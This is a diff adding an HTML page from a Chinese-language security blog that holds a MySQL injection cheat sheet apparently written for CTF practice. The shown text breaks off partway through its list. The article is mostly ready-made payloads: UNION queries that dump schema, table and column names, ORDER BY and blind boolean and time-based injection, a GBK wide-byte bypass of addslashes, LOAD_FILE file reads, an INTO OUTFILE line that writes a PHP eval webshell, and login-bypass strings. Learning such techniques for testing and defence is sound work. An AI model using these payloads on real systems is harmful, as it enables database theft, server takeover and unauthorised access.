@@ -1,0 +1,1332 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="cqIhQLk06F" />
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF,web,SQL注入," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Chybeta" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="简介基本查看当前数据库版本
+VERSION()
+@@VERSION
+@@GLOBAL.VERSION
+
+当前登录用户
+USER()
+CURRENT_USER()
+SYSTEM_USER()
+SESSION_USER()
+
+当前使用的数据库
+DATABASE()
+SCHEMA()
+
+路径相关
+@@BASEDIR : mysql安装路径：
+@@SLAVE_LOAD_TMPDIR : 临时文件夹路径：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySql注入备忘录">
+<meta property="og:url" content="http://yoursite.com/2017/07/21/MySql注入备忘录/index.html">
+<meta property="og:site_name" content="Chybeta">
+<meta property="og:description" content="简介基本查看当前数据库版本
+VERSION()
+@@VERSION
+@@GLOBAL.VERSION
+
+当前登录用户
+USER()
+CURRENT_USER()
+SYSTEM_USER()
+SESSION_USER()
+
+当前使用的数据库
+DATABASE()
+SCHEMA()
+
+路径相关
+@@BASEDIR : mysql安装路径：
+@@SLAVE_LOAD_TMPDIR : 临时文件夹路径：">
+<meta property="og:updated_time" content="2017-07-22T01:45:18.431Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MySql注入备忘录">
+<meta name="twitter:description" content="简介基本查看当前数据库版本
+VERSION()
+@@VERSION
+@@GLOBAL.VERSION
+
+当前登录用户
+USER()
+CURRENT_USER()
+SYSTEM_USER()
+SESSION_USER()
+
+当前使用的数据库
+DATABASE()
+SCHEMA()
+
+路径相关
+@@BASEDIR : mysql安装路径：
+@@SLAVE_LOAD_TMPDIR : 临时文件夹路径：">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/07/21/MySql注入备忘录/"/>
+
+
+
+
+
+  <title> MySql注入备忘录 | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9c37af8d1f8c5ce0455bd146b47dd7c";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Chybeta</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+    
+      <p class="site-subtitle"></p>
+    
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/21/MySql注入备忘录/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="chybeta">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Chybeta">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                MySql注入备忘录
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-21T14:43:02+08:00">
+                2017-07-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+             <span id="/2017/07/21/MySql注入备忘录/" class="leancloud_visitors" data-flag-title="MySql注入备忘录">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h1 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h1><h2 id="查看当前数据库版本"><a href="#查看当前数据库版本" class="headerlink" title="查看当前数据库版本"></a>查看当前数据库版本</h2><ul>
+<li>VERSION()</li>
+<li>@@VERSION</li>
+<li>@@GLOBAL.VERSION</li>
+</ul>
+<h2 id="当前登录用户"><a href="#当前登录用户" class="headerlink" title="当前登录用户"></a>当前登录用户</h2><ul>
+<li>USER()</li>
+<li>CURRENT_USER()</li>
+<li>SYSTEM_USER()</li>
+<li>SESSION_USER()</li>
+</ul>
+<h2 id="当前使用的数据库"><a href="#当前使用的数据库" class="headerlink" title="当前使用的数据库"></a>当前使用的数据库</h2><ul>
+<li>DATABASE()</li>
+<li>SCHEMA()</li>
+</ul>
+<h2 id="路径相关"><a href="#路径相关" class="headerlink" title="路径相关"></a>路径相关</h2><ul>
+<li>@@BASEDIR : mysql安装路径：</li>
+<li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径：</li>
+<li>@@DATADIR : 数据存储路径：</li>
+<li>@@CHARACTER_SETS_DIR : 字符集设置文件路径</li>
+<li>@@LOG_ERROR : 错误日志文件路径：</li>
+<li>@@PID_FILE : pid-file文件路径</li>
+<li>@@BASEDIR : mysql安装路径：</li>
+<li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径：</li>
+</ul>
+<h2 id="联合数据"><a href="#联合数据" class="headerlink" title="联合数据"></a>联合数据</h2><ul>
+<li>CONCAT()</li>
+<li>GROUP_CONCAT()</li>
+<li>CONCAT_WS()</li>
+</ul>
+<h2 id="字母-数字相关"><a href="#字母-数字相关" class="headerlink" title="字母/数字相关"></a>字母/数字相关</h2><ul>
+<li>ASCII(): 获取字母的ascii码值</li>
+<li>BIN(): 返回值的二进制串表示</li>
+<li>CONV(): 进制转换</li>
+<li>FLOOR()</li>
+<li>ROUND()</li>
+<li>LOWER()：转成小写字母</li>
+<li>UPPER(): 转成大写字母</li>
+<li>HEX():十六进制编码</li>
+<li>UNHEX()：十六进制解码</li>
+</ul>
+<h2 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h2><ul>
+<li>MID()</li>
+<li>LEFT()</li>
+<li>SUBSTR()</li>
+<li>SUBSTRING()</li>
+</ul>
+<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><h3 id="行间注释"><a href="#行间注释" class="headerlink" title="行间注释"></a>行间注释</h3><ul>
+<li>— -  (—后面有个空格)<ul>
+<li>DROP sampletable;—</li>
+</ul>
+</li>
+<li>#<ul>
+<li>DROP sampletable;#</li>
+</ul>
+</li>
+<li>` (反引号)</li>
+</ul>
+<h3 id="行内注释"><a href="#行内注释" class="headerlink" title="行内注释"></a>行内注释</h3><ul>
+<li>/* */<br>  +DROP/* 内容 */sampletable;</li>
+<li>/*! 语句  */<ul>
+<li>/*! select * from test */</li>
+<li>语句会被执行</li>
+</ul>
+</li>
+</ul>
+<h1 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h1><h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><p>假设有: www.test.com/chybeta.php?id=1</p>
+<h3 id="数值型注入"><a href="#数值型注入" class="headerlink" title="数值型注入"></a>数值型注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">chybeta.php?id=1+1</div><div class="line">chybeta.php?id=-1 or 1=1</div><div class="line">chybeta.php?id=-1 or 10-2=8</div><div class="line">chybeta.php?id=1 and 1=2</div><div class="line">chybeta.php?id=1 and 1=1</div></pre></td></tr></table></figure>
+<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>参数被引号包围，我们需要闭合引号。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">chybeta.php?id=1&apos;</div><div class="line">chybeta.php?id=1&quot;</div><div class="line">chybeta.php?id=1&apos; and &apos;1&apos;=&apos;1</div><div class="line">chybeta.php?id=1&quot; and &quot;1&quot;=&quot;1</div></pre></td></tr></table></figure></p>
+<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><h3 id="查询列数"><a href="#查询列数" class="headerlink" title="查询列数"></a>查询列数</h3><p>用UNION SELECT注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。</p>
+<h4 id="UNION-SELECT"><a href="#UNION-SELECT" class="headerlink" title="UNION SELECT"></a>UNION SELECT</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">UNION SELECT 1,2,3 #</div><div class="line">UNION ALL SELECT 1,2,3 #</div><div class="line">UNION ALL SELECT null,null,null #</div></pre></td></tr></table></figure>
+<h4 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h4><p>利用二分法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ORDER BY 10 #</div><div class="line">ORDER BY 5  #</div><div class="line">ORDER BY 2  #</div><div class="line">....</div></pre></td></tr></table></figure></p>
+<h3 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UNION SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA #</div></pre></td></tr></table></figure>
+<h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() #</div></pre></td></tr></table></figure>
+<p>假设获取到数据库名为”databasename”后，对其进行十六进制编码得到0x64617461626173656e616d65。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x64617461626173656e616d65 #</div></pre></td></tr></table></figure></p>
+<h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><p>由前一步获取到表名为tablename后，对其进行十六进制编码得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UNION SELECT GROUP_CONCAT(column_name SEPARATOR+0x3c62723e) FROM+INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x7461626c656e616d65 #</div></pre></td></tr></table></figure></p>
+<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UNION SELECT GROUP_CONCAT(column_1,column_2 SEPARATOR+0x3c62723e) FROM databasename.tablename #</div></pre></td></tr></table></figure>
+<h2 id="insert-update-delete注入"><a href="#insert-update-delete注入" class="headerlink" title="insert/update/delete注入"></a>insert/update/delete注入</h2><h2 id="order-by后注入"><a href="#order-by后注入" class="headerlink" title="order by后注入"></a>order by后注入</h2><p>此部分整理自<a href="http://static.hx99.net/static/drops/tips-123.html" target="_blank" rel="external">瞌睡龙:MySql注入科普</a><br>oder by由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>一般带有oder或者orderby的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：</p>
+<p>原始链接：<a href="http://www.test.com/list.php?order=vote" target="_blank" rel="external">http://www.test.com/list.php?order=vote</a> 根据vote字段排序。</p>
+<p>找到投票数最大的票数num然后构造以下链接，看排序是否变化。：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list.php?order=abs(vote-(length(user())&gt;0)*num)+asc</div></pre></td></tr></table></figure></p>
+<p>还有一种方法不需要知道任何字段信息，使用rand函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">list.php?order=rand(true)</div><div class="line">list.php?order=rand(false)</div></pre></td></tr></table></figure></p>
+<p>以上两个会返回不同的排序。</p>
+<p>判断表名中第一个字符是否小于128的语句如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)&lt;=128))</div></pre></td></tr></table></figure></p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="盲注场景"><a href="#盲注场景" class="headerlink" title="盲注场景"></a>盲注场景</h3><p>在许多情况下，通过前面的测试会发现页面没有回显提取的数据，但是根据语句是否执行成功与否会有一些相应的变化。</p>
+<ul>
+<li>正确/错误的语句使得页面有适度的变化。可以尝试使用布尔注入</li>
+<li>正确语句返回正常页面，错误的语句返回通用错误页面。可以尝试使用布尔注入。</li>
+<li>提交错误语句，不影响页面的正常输出。建议尝试使用延时注入。</li>
+</ul>
+<p>几种简单的判断语句，在真实利用中需要根据情况而变化:</p>
+<ul>
+<li>CASE</li>
+<li>IF()</li>
+<li>IFNULL()</li>
+<li>NULLIF()</li>
+</ul>
+<h3 id="布尔盲注-基于响应"><a href="#布尔盲注-基于响应" class="headerlink" title="布尔盲注-基于响应"></a>布尔盲注-基于响应</h3><p>提交一个逻辑判断语句，来推断一个个的信息位。由于注入需要（一般）一个个字符的进行，所以需要利用脚本，或者工具（比如burp suite）。以下是：</p>
+<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">// i 用于提取每一个位，j 用于判断其对应的ASCII码值的范围。</div><div class="line">// k ，结合limit，选择偏移为k的行</div><div class="line">// **中可以填上其他的select语句，比如查询表名，列名，数据。一次类推。</div><div class="line">// SUBSTR() 也可以换成 SUBSTRING()</div><div class="line"></div><div class="line">&apos; OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) &lt; j) #</div><div class="line"></div><div class="line">&apos; OR (SELECT ASCII(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) ) &lt; j) #  </div><div class="line"></div><div class="line">&apos; OR (SELECT SUBSTR(DATABASE(),i,1) &lt; j) #</div><div class="line"></div><div class="line">&apos; OR (SELECT SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j) #  </div><div class="line"></div><div class="line">&apos; OR SUBSTR((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT k,1),i,1) &lt; j #</div><div class="line"></div><div class="line">...</div></pre></td></tr></table></figure>
+<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><p>脚本利用，可见：<a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/#CTF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95" target="_blank" rel="external">ctf盲注利用脚本</a><br>要点：</p>
+<ul>
+<li>注意编码问题</li>
+<li>注意异常处理</li>
+<li>注意边界处理</li>
+</ul>
+<h3 id="延时盲注-基于时间"><a href="#延时盲注-基于时间" class="headerlink" title="延时盲注-基于时间"></a>延时盲注-基于时间</h3><p>一般会用到几个函数。使用这些的效果，是为了延缓mysql的操作，从而检测到与平时有异的情况：</p>
+<ul>
+<li>SLEEP(n) 让mysql停n秒钟</li>
+<li>BENCHMARK(count,expr) 重复countTimes次执行表达式expr</li>
+</ul>
+<p>一些注意事项：</p>
+<ul>
+<li>使用基于时间的盲注比较不准确，因为这还取决于当前的网络环境。</li>
+<li>时间延缓最好不要超过30秒，否则容易导致mysql的API连接超时。</li>
+<li>当在页面上看不到任何明显变化时，再考虑选择使用延时注入。</li>
+</ul>
+<h4 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1 OR SLEEP(25)=0 LIMIT 1 #</div><div class="line">1) OR SLEEP(25)=0 LIMIT 1 #</div><div class="line">1&apos; OR SLEEP(25)=0 LIMIT 1 #</div><div class="line">&apos;) OR SLEEP(25)=0 LIMIT 1 #</div><div class="line">1)) OR SLEEP(25)=0 LIMIT 1 #</div><div class="line">SELECT SLEEP(25) #</div></pre></td></tr></table></figure>
+<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,BENCHMARK(100000,SHA1(1)),0)</div><div class="line"></div><div class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,SLEEP(10),0)</div><div class="line"></div><div class="line">...</div></pre></td></tr></table></figure>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>有如下php代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">mysql_query(<span class="string">"SET NAMES 'gbk'"</span>);</div><div class="line">....</div><div class="line">$name = <span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) ? addslashes($_GET[<span class="string">'name'</span>]) : <span class="number">1</span>;</div><div class="line">$sql = <span class="string">"SELECT * FROM test WHERE names='&#123;$name&#125;'"</span>;</div></pre></td></tr></table></figure></p>
+<p>addslashes()会在单引号或双引号前加上一个<code>\</code>。当mysql使用GBK字符集时，会把两个字符当作一个汉字，如%df%5c为運字。我们输入<code>name=root%df%27</code>，%在服务器端会出现如下转换：<code>root%df%27</code> -&gt; <code>root%df%5c%27</code> -&gt; <code>root運&#39;</code>。</p>
+<p>更多内容可见：<a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="external">浅析白盒审计中的字符编码及SQL注入</a></p>
+<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><h4 id="吃掉"><a href="#吃掉" class="headerlink" title="吃掉\"></a>吃掉<code>\</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">index.php?name=1%df&apos;</div><div class="line">index.php?name=1%a1&apos;</div><div class="line">index.php?name=1%aa&apos;</div><div class="line">...</div></pre></td></tr></table></figure>
+<p>在被addslashes后，出现%XX%5c，当前一个字符的ascii码值大于128时，会被认为是一个宽字符，即使它不是个汉字。所以不是仅仅%df可以吃掉’\‘。</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用\"></a>利用<code>\</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?name=%**%5c%5c%27</div></pre></td></tr></table></figure>
+<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p>利用sql注入可以导入导出文件，获取文件内容，或向文件写入内容。<br>查询用户读写权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT file_priv FROM mysql.user WHERE user = &apos;username&apos;;</div></pre></td></tr></table></figure></p>
+<h3 id="load-file-读取"><a href="#load-file-读取" class="headerlink" title="load_file()读取"></a>load_file()读取</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul>
+<li>需要有读取文件的权限</li>
+<li>需要知道文件的绝对物理路径。</li>
+<li>要读取的文件大小必须小于 max_allowed_packet</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT @@max_allowed_packet;</div></pre></td></tr></table></figure>
+<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><p>直接使用绝对路径,注意对路径中斜杠的处理。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">UNION SELECT LOAD_FILE(&quot;C://TEST.txt&quot;) #</div><div class="line"></div><div class="line">UNION SELECT LOAD_FILE(&quot;C:/TEST.txt&quot;) #</div><div class="line"></div><div class="line">UNION SELECT LOAD_FILE(&quot;C:\\TEST.txt&quot;) #</div></pre></td></tr></table></figure></p>
+<p>使用编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">UNION SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116)) #</div><div class="line"></div><div class="line">UNION SELECT LOAD_FILE(0x433a5c5c544553542e747874) #</div></pre></td></tr></table></figure></p>
+<h3 id="select导出"><a href="#select导出" class="headerlink" title="select导出"></a>select导出</h3><h4 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h4><ul>
+<li>一般要指定绝对路径</li>
+<li>需导出的目录有可写权限</li>
+<li>要outfile出的文件不能已经存在</li>
+</ul>
+<h4 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">UNION SELECT DATABASE() INTO OUTFILE &apos;C:\\phpstudy\\WWW\\test\\1&apos;;</div><div class="line"></div><div class="line">UNION SELECT DATABASE() INTO OUTFILE &apos;C:/phpstudy/WWW/test/1&apos;;</div></pre></td></tr></table></figure>
+<h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><h5 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h5><ul>
+<li>需要知道网站的绝对物理路径，这样导出后的webshell可访问</li>
+<li>对需导出的目录有可写权限。</li>
+</ul>
+<h5 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UNION SELECT  &quot;&lt;?php eval($_POST[&apos;chybeta&apos;])?&gt;&quot; INTO OUTFILE &apos;C:/phpstudy/WWW/test/webshell.php&apos;;</div></pre></td></tr></table></figure>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h2 id="万能密码后台登陆"><a href="#万能密码后台登陆" class="headerlink" title="万能密码后台登陆"></a>万能密码后台登陆</h2><ul>
+<li>admin’ —</li>
+<li>admin’ #</li>
+<li>admin’/*</li>
+<li>or ‘=’ or</li>
+<li>‘ or 1=1—</li>
+<li>‘ or 1=1#</li>
+<li>‘ or 1=1/*</li>
+<li>‘) or ‘1’=’1—</li>
